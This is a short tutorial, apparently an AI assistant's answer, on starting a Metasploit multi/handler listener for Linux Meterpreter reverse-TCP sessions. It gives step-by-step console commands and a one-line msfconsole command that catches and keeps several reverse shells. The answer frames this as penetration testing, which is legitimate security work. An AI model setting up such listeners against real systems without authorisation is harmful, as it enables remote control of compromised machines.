Using a Meterpreter multi handler shell in Metasploit is a great idea for catching multiple shells when running your tests! Metasploit's `exploit/multi/handler` module is designed to handle incoming connections from various payloads, including Meterpreter. This allows you to manage multiple sessions simultaneously and interact with them through the Meterpreter interface.

Here's a basic example of how to set up a multi handler shell in Metasploit:

1. **Start Metasploit:**
   ```bash
   msfconsole
   ```

2. **Use the multi handler module:**
   ```bash
   use exploit/multi/handler
   ```

3. **Set the payload:**
   ```bash
   set PAYLOAD linux/x64/meterpreter/reverse_tcp
   ```

4. **Set the local host and port:**
   ```bash
   set LHOST 0.0.0.0
   set LPORT 4443
   ```

5. **Prevent exiting on session creation:**
   ```bash
   set EXITONSESSION false
   ```

6. **Run the handler:**
   ```bash
   exploit -j
   ```

This will start a handler that listens for incoming Meterpreter connections on the specified port and handles multiple sessions.



# Meterpeter one-liner

Absolutely! You can use the following one-liner command to set up a Meterpreter multi handler shell with Metasploit:

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4443; set EXITONSESSION false; exploit -j"
```

This command does the following:
1. Starts Metasploit in quiet mode (`-q`).
2. Uses the `exploit/multi/handler` module.
3. Sets the payload to `linux/x64/meterpreter/reverse_tcp`.
4. Sets `LHOST` to listen on all interfaces.
5. Sets `LPORT` to 4443.
6. Configures the handler to not exit on session creation (`EXITONSESSION false`).
7. Runs the handler in the background (`-j`).

This way, you can quickly start a Meterpreter multi handler shell in a single line.
